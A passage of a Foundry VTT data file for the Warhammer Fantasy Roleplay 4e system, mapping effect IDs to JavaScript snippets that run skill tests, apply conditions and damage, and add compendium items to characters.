fromUuid(\"Compendium.wfrp4e-core.items.Item.IogM5gnsoOX63w7j\")\nthis.actor.createEmbeddedDocuments(\"Item\", [drilled, fearless, stout], {fromEffect : this.effect.id})","B063u4vrbvzMaCQt":"args.item.system.flaws.value = args.item.system.flaws.value.concat([{name : \"bulky\"}, {name : \"unreliable\"}])","B1xgRS00RcTIZLnO":"return [\"cast\", \"channelling\"].includes(args.type) && this.actor.hasCondition(\"fatigued\")","B6ZbY3bxTPg6nCng":"return args.skill?.name == game.i18n.localize(\"NAME.Bribery\");","B87v1twc65qyvUWi":"args.fields.modifier += 10 * this.effect.conditionValue","B950b0XnIUYCdVwu":"let test = await args.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\n\nif (test.succeeded)\n{\n    if (args.totalWoundLoss <= parseInt(test.result.SL))\n    {\n        args.abort = `<strong>${this.effect.name}</strong>: Attack deflected and reflected`\n    }\n    args.modifiers.other.push({label : this.effect.name, value : -1 * parseInt(test.result.SL)})\n}","BAOv7moTxsKlT3JS":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {fields : {difficulty : \"easy\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"broken\")\n}","BD7bVTU2pVoRSRBe":"let symptoms = {\n    convulsions : \"Convulsions\",\n    coughsandsneezes : \"Coughs and Sneezes\",\n    fever : \"Fever\",\n    flux : \"Flux\",\n    nausea : \"Nausea\"\n}\n\nlet roll = await (new Roll(`max(0, 1d10 - ${this.actor.characteristics.wp.bonus})`).roll())\nroll.toMessage(this.script.getChatData());\n\nlet choices = await ItemDialog.create(ItemDialog.objectToArray(symptoms), roll.total, \"Choose Symptoms\");\n\nif (choices.length)\n{\n    let symptomEffects = foundry.utils.duplicate(game.wfrp4e.config.symptomEffects)\n    let added = []\n    for(let choice of choices)\n    {\n        let symptom = symptomEffects[choice.id];\n        symptom.origin = this.effect.uuid;\n        added.push(symptom);\n    }\n    this.actor.createEmbeddedDocuments(\"ActiveEffect\", added)\n}\nelse \n{\n    this.effect.delete();\n}\n\n","BHbFqhJPzZI2txLs":"let lore = this.effect.name.split(\"(\")[1].split(\")\")[0].toLowerCase();\n\n// If channelling corresponding lore\nif (args.type == \"channelling\" && args.spell.system.lore.value == lore)\n    args.prefillModifiers.slBonus  += 2\n// If channelling or casting different lore\nelse if (args.spell.system.lore.value != lore && args.spell.system.lore.value != \"petty\")\n    args.prefillModifiers.slBonus  -= 1","BVNKF9omCppWPLys":"let actor = game.user.character ?? canvas.tokens.controlled[0]?.actor;\nif (!actor || !(actor.system instanceof StandardActorModel))\n  return ui.notifications.warn(\"You must control an Actor capable of performing a Strength Test\");\n\nlet test = await actor.setupCharacteristic(\"s\", {\n  skipTargets: true, \n  appendTitle:  \" - Bailing Out\", \n  fields: {\n    difficulty: \"challenging\"\n  },\n  context: {\n    success: \"Reduced the Holed rating!\"\n  }\n});\n\nawait test.roll();\nif (test.succeeded) {\n  let SL = parseInt(test.result.SL);\n  let name = this.effect.name.replace(/\\d+/, rating => parseInt(rating) - SL);\n  await this.effect.update({name});\n}\n\nlet rating = parseInt(this.effect.name.match(/\\d+/)?.[0]);\nif (rating <= 1) {\n  const scriptData = this.effect.flags.wfrp4e.scriptData;\n  scriptData[2].trigger = '';\n  await this.effect.update({disabled: true, \"flags.wfrp4e.scriptData\": scriptData});\n}","BZETMpgrI5k1ol5b":"// If the creature currently has a Surprised, Unconscious, or Entangled Condition, it does not gain this Advantage.\nconst surprised = this.actor.hasCondition(\"surprised\")\nconst unconscious = this.actor.hasCondition(\"unconscious\")\nconst entangled = this.actor.hasCondition(\"entangled\")\nif (entangled || unconscious || surprised) return\n\n// If, at the beginning of its turn, this creature does not have at least Rating Advantage points, its Advantage pool immediately increases to Rating.\nconst grimRating = parseInt(this.item.specification.value) || 1\nif (grimRating > this.actor.status.advantage.value) {\n  this.actor.setAdvantage(grimRating)\n}\n","BcXTujburrHpjpwa":"args.fields.slBonus -= 3;","Be5rdfnZorbILhpC":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\nlet data = item.toObject();\ndata.system.specification.value = 3 - this.actor.characteristics.s.bonus\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","Bexspr5viPhHiFmU":"let fatigued = this.actor.hasCondition(\"fatigued\");\nlet value = fatigued?.conditionValue || 0;\nargs.fields.modifier += value * 10;","Bj6bxItlgtI2sXVN":"let roll = await new Roll(\"1d10\").roll();\nroll.toMessage(this.script.getChatData());\nargs.totalWoundLoss = Math.max(0, args.totalWoundLoss - roll.total)\nargs.modifiers.other.push({label: this.effect.name, value : -1 * roll.total})\nthis.effect.update({disabled : true})","BtyFhdGMKiMamGhM":"let test = await args.actor.setupSkill(\"Dodge\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nlet damage = parseInt(this.effect.sourceTest.result.SL)\n\nif (test.succeded)\n{\n   damage =  damage + 8 - parseInt(test.result.SL)\n}\n\nelse \n{\n   damage = damage + 10\n   this.actor.addCondition(\"entangled\", 3)\n}\nthis.script.scriptMessage(await this.actor.applyBasicDamage(damage, {loc : \"roll\", suppressMsg: true}))\n","Bv3431tnG3VKaTJr":"if (args.test.result.castOutcome == \"success\")\n{\n    args.test.result.other.push(`@Fear[2,${this.actor.name}]`);\n}","ByhEa1BxQOyrOmqg":"return args.item?.attackType == 'melee'","BzDLuxBNw1QNIacg":"if (args.item.type == \"skill\")\n   args.item.system.advances.value = 0\n\nif (args.item.type == \"talent\")\n    args.item.system.tests.value = \"\"\n\nif (args.item.type == \"weapon\") \n   args.item.system.qualities.value = []","C69xngEMghfwUx13":"let easier = ['challenging', 'average', 'easy', 'veasy'];\nif (easier.includes(args.fields.difficulty))\n  args.fields.difficulty = \"difficult\";","CCK1iIfPmB398ziT":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Athletics\"), {fields : {difficulty : \"difficult\"}, skipTargets: true, appendTitle :  \" - Walking\"})\ntest.roll();","CCwuu3bPLCpVGAmb":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\n\n","CD4RnDpXZ9hnqVPQ":"if (!this.actor.hasCondition(\"entangled\"))\n  this.actor.addCondition(\"entangled\");","CDASLC4fWKSGQKf9":"let blinded = this.actor.hasCondition(\"blinded\");\nif (blinded?.getFlag(\"wfrp4e\", \"flockOfDoom\"))\n{\n    blinded.delete();\n}","CHnaBPHk6HdFS512":"let arm = await fromUuid(\"Compendium.wfrp4e-core.items.MnMZv7ZXoRqoH9dS\");\nlet leg = await fromUuid(\"Compendium.wfrp4e-core.items.k00PimCWkff11IA0\");\n\nlet choice = await ItemDialog.create([arm, leg], 1, \"Choose Limb\")\n\nthis.actor.createEmbeddedDocuments(\"Item\", choice, {fromEffect: this.effect.id})","CIxZYkHggBQ6EsHP":"this.script.scriptNotification(\"Effect Used\");\nthis.effect.delete();","CM43kvw5mIIE1OsB":"let key = this.item.system.location.key\n\nlet lostFingers = this.actor.flags.useless[key] || 0;\n\nlostFingers += 1\n\nthis.actor.flags.useless[key] = lostFingers;\n\nif (lostFingers >= 4)\n{\n\tthis.actor.flags.useless[key[0] + \"Arm\"] = true;\n}","CMUFtmNA1kkD1ay7":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 30,\n      \"bright\": 20,\n      \"angle\": 90,\n      \"alpha\": 0.6,\n      \"animation\": {\n          \"speed\": 3,\n          \"intensity\": 3,\n          \"type\": \"torch\",\n      },\n      \"color\": \"#ffcc66\",\n  }}));","CPQoK7NjzOwVTFXS":"for(let effect of this.actor.effects.filter(e => e.isCondition))\n{\n    if (effect.isCondition)\n    {\n        effect.delete();\n    }\n}","CS6O7UUjQcUJoOUP":"if (args.test.failed)\n                        {\n                          let SL = Number(args.test.result.SL)\n                          if (SL <= -2 && SL > -4)\n                            this.actor.addCondition(\"stunned\")\n                          else if (SL <= -4 && SL > -6)\n                            this.script.scriptMessage(this.actor.prototypeToken.name + \" must make a <b>Willpower</b> Test or fall @Condition[Prone].\")\n                          else if (SL <= -6)\n                            this.actor.addCondition(\"unconscious\")\n                        }","CW5Vlr57OaMkKJ8Q":"if (this.actor.system.status.advantage.value >= 3)\n{\n    this.actor.modifyAdvantage(-3);\n    this.script.scriptNotification(\"Advantage Subtracted\")\n}\nelse \n{\n    return this.script.scriptNotification(\"Not enough Advantage!\", \"error\")\n}\n\nlet test = await this.actor.setupTrait(this.item)\nawait test.roll();","CWNGrg7se91RC95g":"if (args.totalWoundLoss > 0) {\n  args.opposedTest.result.other.push(\n  `@Corruption[minor]{Moderate Exposure to Corruption}`\n  )\n  this.script.scriptMessage(`<strong>${this.effect.name}</strong>: \n      @Corruption[moderate]{Moderate Exposure to Corruption} <br/>\n      <strong>${args.actor.prototypeToken.name}</strong> must take an \n      <strong>Corruption (Moderate) Test</strong>`, \n      {whisper: ChatMessage.getWhisperRecipients(\"GM\")}\n  )\n}","Ca1fXHTA1e2QLx0D":"args.fields.modifier += 50;","CiFeduksZJ6PRulx":"return args.skill?.name == \"Ride (Horse)\" || (args.options.dodge && this.actor.isMounted);","Cjj4iLkdY1NaZRCi":"if ((args.opposedTest.attackerTest.item && args.opposedTest.attackerTest.item.isMelee) || (args.opposedTest.attackerTest.item && !args.opposedTest.attackerTest.item.name.includes(\"Ranged\")))\n{\n    let choice = await Dialog.wait({\n        title: this.effect.name,\n        content: `<p>Apply damage with <strong>${this.effect.name}</strong> to attacker?`,\n        buttons: {\n            yes: {\n                label: \"Yes\",\n                callback: () => {\n                    return true;\n                }\n            },\n            no: {\n                label: \"No\",\n                callback: () => {\n                    return false;\n                }\n            }\n        }\n    })\n\n    if (choice)\n    {\n        this.script.scriptMessage(await args.attacker.applyBasicDamage(this.actor.system.characteristics.wp.bonus, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true}));\n    }\n}","CkE8NZOhzPkuRrKJ":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.MnMZv7ZXoRqoH9dS\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\nthis.actor.createEmbeddedDocuments(\"Item\", [data])\n\n\n\n\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty: \"hard\"}, skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed)\n{\n\tthis.actor.addCondition(\"unconscious\")\n}","CoImIH9OCMx9DfQZ":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.nbhn2wX35b7Jrcbg\")\nlet data = item.toObject();\ndata.system.location.value = \"Jaw\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","D5XmzrUGFa1JN0cl":"args.prefillModifiers.modifier += 10\n\n","DANLE5HxrkTNelhl":"args.wounds += 4;","DBafsY1HrclJRTtA":"return args.type != \"cast\"","DHxUKY9LMyifFgCi":"return args.skill?.name == \"Trade (Apothecary)\" || args.skill?.name == \"Trade (Alchemist)\"","DL9vYNft9aXdV2aW":"let tooth = await fromUuid(\"Compendium.wfrp4e-core.items.pLW9SVX0TVTYPiPv\")\ntooth = tooth.toObject()\ntooth.system.specification.value = 3\ntooth.system.qualities.value = [{name : \"magical\"}]\n \nlet claw = await fromUuid(\"Compendium.wfrp4e-core.items.AtpAudHA4ybXVlWM\")\nclaw = claw.toObject()\nclaw.system.specification.value = 4\nclaw.system.qualities.value = [{name : \"magical\"}]\nclaw.name = \"Claw\"\n\nthis.actor.createEmbeddedDocuments(\"Item\", [tooth, claw], {fromEffect : this.effect.id})","DMQ0taEpBUJU5njV":"args.actor.status.fortune.value = 0","DTiHS6RfwhF4THbf":"return args.skill?.name != game.i18n.localize(\"NAME.Drive\") && !args.skill?.name.includes(game.i18n.localize(\"NAME.Ride\"));","DVlZGbiuMIHEQOnM":"if (this.actor.getFlag(\"wfrp4e\", \"isAttached\")) \n{\n\tlet roll = await new Roll(\"1d10\").roll()\n\tawait roll.toMessage(this.script.getChatData());\n\tif (roll.total == 9 || roll.total == 10)\n\t{\n\t  this.script.scriptMessage(`<strong>${this.actor.name}</strong> attached to <strong>${this.actor.getFlag(\"wfrp4e\", \"isAttached\")}</strong> gorges and falls off.`)\n\t  await this.actor.unsetFlag(\"wfrp4e\", \"isAttached\")      \n\t}\n  }","DWBxvzfWGcG7PVNP":"let letter = this.item.system.location.key[0]; // \"l\" or \"r\";\n\nthis.item.updateSource({\"system.location.key\" : letter + \"Finger\"})\n\n// We want the location to be Right or Left Hand, but the key to be rFinger or lFinger","DcSJNRBXE9ZBBY7T":"this.actor.addCondition(\"blinded\", Math.max(0, this.effect.sourceTest.result.SL))","DhZqJso1JWYtGrKk":"this.actor.addCondition(\"ablaze\")\nlet damage = this.effect.sourceTest.result.damage + this.effect.sourceTest.result.additionalDamage\nthis.script.scriptMessage(await this.actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true}))","DmbWR9s5I8LHBwxB":"let column = await ValueDialog.create(\"Select the column to roll on to determine Beast Head\", \"Select Column\", \"\", [\"Undivided\", \"Khorne\", \"Nurgle\", \"Slaanesh\", \"Tzeentch\"]);\n\nif (column)\n{\n    let result = await game.wfrp4e.tables.rollTable(\"beasthead\", {}, column);\n    this.script.scriptMessage(`<strong>${result.title}</strong><br>${result.result}`);\n    let uuid = `Compendium.${result.object.documentCollection}.${result.object.documentId}`;\n    let item = await fromUuid(uuid);\n    if (item)\n    {\n        this.actor.createEmbeddedDocuments(\"Item\", [item])\n        this.item.delete();\n    }\n}","DpdSEHM6NMN1ey6h":"if (parseInt(this.item.system.specification.value) > 0)\n{\n\tthis.actor.system.status.ward.value = parseInt(this.item.system.specification.value);\n}","DqJFo74trI916qXN":"let fatigued = args.actor.hasCondition(\"fatigued\")\nif (fatigued)\n    foundry.utils.setProperty(fatigued, \"flags.wfrp4e.scriptData\", foundry.utils.getProperty(fatigued, \"flags.wfrp4e.scriptData\").filter(s => s.trigger != \"dialog\"))","DsE6rTSzxEn6uWMz":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"average\"}})\nawait test.roll();\nif (test.failed)\n{ \n  await this.actor.addCondition(\"blinded\");\n  await this.actor.addCondition(\"fatigued\")\n} ","DuM5l2Yb4bdvDeaG":"return args.skill?.name != \"Athletics\"","DxQnamsb2AuW0p2e":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Lore\"));","DyZ1jH88EAp1ueOK":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.GlShFJF2TpsNh1FX\")\nlet data = item.toObject();\ndata.system.location.key = this.item.system.location.key\ndata.system.location.value = data.system.location.value.replace(\"Arm\", \"Wrist\")\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})\n","Dzi2CKpYapRGwNVr":"if (args.actor.system instanceof StandardActorModel) {\n  args.actor.addCondition(\"unconscious\");\n}","E1Xo4RVuN1YRRxg7":"return args.item?.attackType != \"ranged\"","E1vUepgop09FF5wy":"if (this.actor.system.status.advantage.value == 0)\n{\n    return this.script.scriptNotification(\"Not enough Advantage!\", \"error\")\n}\n\nlet hatred = await fromUuid(\"Compendium.wfrp4e-core.items.Item.aE3pyW20Orvdjzj0\")\nlet frenzy = await fromUuid(\"Compendium.wfrp4e-core.items.Item.yRhhOlt18COq4e1q\");\n\nif (this.actor.system.status.advantage.value >= 3)\n{\n    this.script.scriptNotification(`Adding ${frenzy.name}`)\n    this.actor.setAdvantage(0)\n    this.actor.createEmbeddedDocuments(\"Item\", [frenzy])\n}\nelse if (this.actor.system.status.advantage.value >= 1)\n{\n    let data = hatred.toObject();\n    data.system.specification.value = \"Close Combat opponents\"\n    this.script.scriptNotification(`Adding ${hatred.name}`)\n    this.actor.setAdvantage(0)\n    this.actor.createEmbeddedDocuments(\"Item\", [data])\n}","E2VfOVuju67qO3VL":"let blinded = this.actor.hasCondition(\"blinded\");\nif (blinded.getFlag(\"wfrp4e\", \"nightshroud\"))\n{\n    blinded.delete()\n}","E3om295BMQojnM2F":"let fatigued = this.actor.hasCondition(\"fatigued\")\nif (fatigued)\n{\n    fatigued.delete();\n    this.script.scriptNotification(\"Removed Fatigued\")\n}","E4CHDe1xfmcV3oGv":"return args.skill?.name == game.i18n.localize(\"NAME.Navigation\");","E6DMqfDeczqmVMFV":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Cool\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"average\"}})\n\nawait test.roll();","E7D4bxz8gy4e1wL7":"if ([\"Stealth (Rural)\", \"Track\", \"Outdoor Survival\", \"Swim\", \"Perception\", \"Intuition\"].includes(args.item?.name))","EBNrA6FNX4d05EUx":"return !args.options.crewTest;","EC8cZmqrE095cDc2":"const actor = args.actor;\n\nif (actor.itemTypes.skill.find(s => s.name === \"Lore (Riverways)\")) {\n  const loreTest = await actor.setupSkill('Lore (Riverways)',  {\n    appendTitle: ` – ${this.effect.name}`,\n    skipTargets: true,\n    fields: {difficulty: 'hard'},\n    characteristic: 'int',\n  });\n  await loreTest.roll();\n\n  if (loreTest.succeeded) {\n    loreTest.result.other.push(`<b>${actor.name}</b> recognizes lures of Lurkerfish.`);\n    loreTest.renderRollCard();\n    return;\n  } \n}\n\nlet test = await actor.setupSkill('Cool',  {\n  appendTitle: ` – ${this.effect.name}`,\n  skipTargets: true,\n  fields: {difficulty: 'easy'},\n  characteristic: 'wp',\n});\nawait test.roll();\n\nif (!test.succeeded) {\n  test.result.other.push(`<b>${actor.name}</b> became beguiled by the sight and unable to perform any action except moving towards the light.`);\n  test.renderRollCard();\n  actor.addCondition(\"unconscious\");\n}","EDAMEOzdBfkoKHxP":"return args.skill?.name !== game.i18n.localize(\"NAME.Navigation\");","EGWF3LHav3e2zFL4":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Ranged\")) || args.item?.isRanged || args.item?.name == game.i18n.localize(\"NAME.Charm\");","EJObiSth3WdcJOXN":"if (args.test.characteristicKey == \"wp\" && args.test.failed && args.test.result.SL <= -3)\n{\n    this.script.scriptNotification(\"Adding Prone\");\n    this.actor.addCondition(\"prone\")\n}","EJaBfqADqlo92Fx6":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.oGbDwnLOn3isPJpO\")\nlet data = item.toObject();\ndata.name += \" (To Be Determined)\"\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","EKkdyp51Wf4csw2B":"return this.actor.statuses.has(\"frenzy\");","ENGmwaItRXO5s0XY":"await this.actor.modifyWounds(this.actor.system.characteristics.t.bonus * 3)\nthis.script.scriptMessage(`Heals ${this.actor.system.characteristics.t.bonus * 3} Wounds`)\n\nthis.actor.hasCondition(\"bleeding\")?.delete()\nthis.actor.hasCondition(\"fatigued\")?.delete()\n","EQ5dtGW5kQhtAb87":"await this.actor.addCondition(\"prone\")\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"hard\"}, skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\nif (test.failed)\n{\n\tawait this.actor.addCondition(\"stunned\")\n}","ERxrWzSpw8qwxFVi":"this.script.scriptNotification(`Cannot enter ${this.effect.name}!`); this.actor.addCondition(\"broken\");","ETfmit2Cx0Py77ai":"let characteristics = {\n    \"ws\" : -10,\n    \"bs\" : 0,\n    \"s\" : 0,\n    \"t\" : 0,\n    \"i\" : -25,\n    \"ag\" : -20,\n    \"dex\" : 0,\n    \"int\" : -200,\n    \"wp\" : -200,\n    \"fel\" : -200\n}\nlet traits = [ {name:\"Construct\"}, {name:\"Dark Vision\"}, {name:\"Fear\", value: 2}, {name:\"Painless\"},{name:\"Undead\"},{name:\"Unstable\"} ];\nlet items = [];\n\nlet updateObj = this.actor.toObject();\nfor (let ch in characteristics)\n{\n    updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nupdateObj.system.characteristics.int.initial = 0;\nupdateObj.system.characteristics.wp.initial = 0;\nupdateObj.system.characteristics.fel.initial = 0;\n\nfor (let trait of traits)\n{\n    let traitItem = await game.wfrp4e.utility.find(trait.name, \"trait\")\n    if (traitItem)\n    {   \n        let t = traitItem.toObject();\n        t.system.specification.value = trait.value;\n        items.push(t);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trait.name}`, {permanent : true})\n    }\n}\n\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\n","EU5j0hnDTG9Z6d1e":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}})\nawait test.roll();\nif(test.failed)\n{\n    this.actor.addCondition(\"stunned\", 2)\n}","EVBSHEC5nmmj2X41":"return args.skill?.name != game.i18n.localize(\"NAME.Climb\")  && !args.skill?.name?.includes(game.i18n.localize(\"NAME.Stealth\"));","EYny6z5oTOhxGDfb":"args.fields.modifier -= 10;\n","EaSNOmXUxAkUHnm5":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","Eay7GpDyfsEE40jT":"if (args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"ablaze\")\n}","EdTChmSouS0MSmk5":"let test = await this.actor.setupCharacteristic(\"wp\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.succeeded)\n{\n    this.script.scriptMessage(\"Can perform an Action or Move (choose one)\")\n}\nelse \n{\n    this.script.scriptMessage(\"Cannot perform an Action or Move this round\")    \n}","EiLaZW4b4ypw5sLV":"// can't use Damage application type because that checks if wounds were dealt\nargs.actor.applyEffect({effectUuids : this.item.effects.contents[0].uuid})","EmXwcuycEH8slEn5":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}})\nawait test.roll();\nif(test.failed)\n{\n    this.actor.addCondition(\"unconscious\")\n}","EmmG49pMOPHRwDzR":"   let roll = Math.ceil(CONFIG.Dice.randomUniform() * 10)\n   if (args.test.isFumble && roll == 1 && !args.test.result.misfire)\n  {\n          args.test.result.misfire = game.i18n.localize(\"Misfire\") + \" (Rolled 1)\"\n          args.test.result.misfireDamage = eval(parseInt(args.test.result.roll.toString().split('').pop()) + args.test.item.Damage)\n  }\n  else if (args.test.isFumble && roll != 1)\n      args.test.result.other.push(\"Misfire Roll: \" + roll)\n","EpdMj9d9SYPeP44q":"return args.characteristic != \"ag\"  && args.item?.id != this.item?.id","ErgOwSiVnm9VLVHN":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.DrNUTPeodEgpWTnT\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","Et4tPHlrkueLqP3T":"if (args.item.type == \"skill\") args.item.system.modifier.value -= 10","Ew3C2WmLCtc1KT46":"return args.skill?.name.includes(game.i18n.localize(\"NAME.Stealth\")) || args.item?.id == this.item?.id","EwD053Fyy46b59ZI":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.6l3jvIAvrKxt0lA9\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect: this.effect.id})","Eye6dranWpNsILjm":"if (this.actor.system.status.wounds.value <= 1)\n{\n    this.effect.delete();\n}","F2u4L4o0r1LTWeWK":"if (isNaN(parseInt(this.item.system.specification.value)))\n{\n    let value = await ValueDialog.create(\"Enter Terror value\", this.effect.name);\n    if (value)\n    {\n     this.item.updateSource({\"system.specification.value\" : value});\n    }\n}","F4aGsdzJ9SYcX57F":"if (args.equipped)\n{\n    let item = await fromUuid(\"Compendium.wfrp4e-core.items.HpFkVJ2lYPAWumUL\")\n    let data = item.toObject();\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n}\nelse \n{\n    this.effect.deleteCreatedItems();   \n}","FAB12eLcSCAOOQwk":"this.script.scirptMessage(await this.actor.applyBasicDamage(20, {suppressMsg: true});","FAf4iXj5LkdvukS2":"fromUuid(\"Compendium.wfrp4e-wom.items.0Xdm4r7l2EwC4fcg\").then(item => Item.create(item.toObject(), {fromEffect : this.effect.id, parent : this.actor}))","FMA16PvoObBV8vDl":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.EO05HX7jql0g605A\")\nitem = item.toObject()\nitem.system.specification.value = 20\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})\nthis.script.scriptNotification(item.name + \" added\")","FMSN5uRskkATexzB":"game.wfrp4e.tables.rollToChat(\"crithead\")","FPYNcxm21678boLT":"if (args.attackerTest.data.preData.rollClass !== \"CharacteristicTest\") return;\nif (args.attackerTest.data.preData.characteristic !== \"s\") return;\n\nconst SL = args.opposedTest.data.opposeResult.differenceSL;\n\nconst targetId = this.effect.getFlag(\"wfrp4e\", \"target\");\nconst target = canvas.scene.tokens.get(targetId);\n\nif (SL > 4) {\n  args.opposedTest.data.opposeResult.other.push(`<b>${args.defenderTest.actor.name}</b> was forced to let go of <b>${target.name}</b>.`);\n  return await this.effect.delete();\n}\n\nif (SL > 0) {\n  args.opposedTest.data.opposeResult.other.push(`<b>${args.defenderTest.actor.name}</b> was prevented from squeezing <b>${target.name}</b> for one turn.`);\n  let turns = this.effect.getFlag(\"wfrp4e\", \"turns\");\n  this.effect.setFlag(\"wfrp4e\", \"turns\", turns + 1);\n}","FSqUqSByMiztYOQM":"if (args.totalWoundLoss > 0)\n     this.script.scriptMessage(`<b>Infected: ${args.actor.name}</b> must pass an <b>Easy (+40) Endurance</b> Test or gain a @UUID[Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb]{Festering Wound}`, {whisper: ChatMessage.getWhisperRecipients(\"GM\") })","FUgCtIoj1Stgqxt7":"return ![\"ws\", \"bs\", \"s\", \"ag\", \"t\", \"dex\"].includes(args.characteristic)","FXuyiJoXdAh6WhRK":"return args.skill?.name == \"Ride (Horse)\" && game.combat?.active","FXwfqF0jpXlBQ9Y3":"return args.item?.system?.isMelee && this.actor.attacker","FYUPfYyTYZkxRLFT":"return ![\"NAME.Endurance\", \"NAME.Cool\"].map(i => game.i18n.localize(i)).includes(args.skill?.name)","FZFOC7bip0oiWEzk":"if (args.opposedTest.result.hitloc.value == this.item.system.location.key && args.totalWoundLoss > 0)\n{\n    args.actor.addCondition(\"bleeding\", 2);\n    this.script.scriptNotification(\"Added Bleeding\")\n}","FciJSTq7dZsZIPgl":"if (args.equipped)\n{\n    let item = await fromUuid(\"Compendium.wfrp4e-core.items.SfUUdOGjdYpr3KSR\")\n    let data = item.toObject();\n    this.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n}\nelse \n{\n    this.effect.deleteCreatedItems();   \n}","FfTqCPxCoxwGDTQs":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.wMwSRDmgiF2IdCJr\")\nlet data = item.toObject()\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})\n","FiD3mvWIBHNNIuO9":"if (args.opposedTest.result.hitloc.value == \"body\")\n{\n   if ((await new Roll(\"1d2\").roll()).total == 1)\n   {\n       args.opposedTest.result.hitloc.value = \"head\"\n       this.script.scriptMessage(`Hit location changed to Head`)\n   }\n}","FkTwk8hfHpRLbAp2":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}","FmLx9pwOkzqqU7Ph":"return args.skill?.name == game.i18n.localize(\"NAME.Track\");","FqevMs0ukQ9WuUHl":"// Each time the blade is used, the GM should secretly roll a d10.\n// On a 1, its poison has run dry, \n// and the next time it is employed it will shatter.\n\nif (this.item.getFlag(\"wfrp4e\", \"brittle\"))\n{\n    ChatMessage.create({content: `<strong>${this.item.name}</strong> shatters!`})\n    this.item.update({name : `${this.item.name} (Shattered)`})\n}","FtZf56VI6Qsspu0D":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'difficult';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: 